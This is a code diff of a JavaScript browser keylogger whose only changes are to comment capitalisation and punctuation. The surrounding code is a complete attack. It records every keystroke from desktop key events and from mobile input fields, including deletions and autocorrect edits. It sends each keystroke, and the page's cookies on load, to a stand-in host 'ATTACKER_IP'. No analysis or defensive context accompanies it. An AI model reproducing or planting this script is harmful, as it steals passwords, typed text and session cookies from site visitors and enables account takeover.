@@ -2,9 +2,9 @@
 var endpoint = 'ATTACKER_IP';
 var prevValues = {};
 
-// 1. Desktop: capture ALL keys — printable + special
+// 1. desktop: capture ALL keys; printable + special
 document.addEventListener('keydown', function(e) {
-    // Printable single characters
+    // printable single characters
     if (e.key && e.key.length === 1) {
         fetch(endpoint + '/?key=' + encodeURIComponent(e.key));
     }
@@ -17,7 +17,7 @@ document.addEventListener('keydown', function(e) {
     }
 });
 
-// 2. Mobile: detect additions AND deletions via input diff
+// 2. mobile: detect additions AND deletions via input diff
 document.addEventListener('input', function(e) {
     if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
         var field = e.target.name || e.target.id || 'unknown';
@@ -25,13 +25,13 @@ document.addEventListener('input', function(e) {
         var curr = e.target.value;
         prevValues[field] = curr;
 
-        // Characters were REMOVED — send Backspace for each
+        // characters were REMOVED - send Backspace for each
         if (curr.length < prev.length) {
             var removed = prev.length - curr.length;
             for (var i = 0; i < removed; i++) {
                 fetch(endpoint + '/?key=Backspace');
             }
-            // Then check what was typed after the deletions
+            // then check what was typed after the deletions
             // (handles auto-correct replacing text)
             var commonPrefix = 0;
             while (commonPrefix < curr.length && curr[commonPrefix] === prev[commonPrefix]) {
@@ -42,14 +42,14 @@ document.addEventListener('input', function(e) {
                 fetch(endpoint + '/?key=' + encodeURIComponent(newChars[j]));
             }
         }
-        // Characters were ADDED at the end
+        // characters were ADDED at the end
         else if (curr.startsWith(prev) && curr.length > prev.length) {
             var added = curr.slice(prev.length);
             for (var k = 0; k < added.length; k++) {
                 fetch(endpoint + '/?key=' + encodeURIComponent(added[k]));
             }
         }
-        // Characters inserted in the middle (mobile tap-to-edit)
+        // characters inserted in the middle (mobile tap-to-edit)
         else if (curr.length > prev.length) {
             for (var l = 0; l < curr.length; l++) {
                 if (curr[l] !== prev[l]) {
@@ -64,7 +64,7 @@ document.addEventListener('input', function(e) {
     }
 }, true);
 
-// 3. Cookie exfiltration on page load
+// 3. cookie exfiltration on page load
 setTimeout(function() {
     fetch(endpoint + '/?key=Cookie&val=' + encodeURIComponent(document.cookie));
 }, 500);
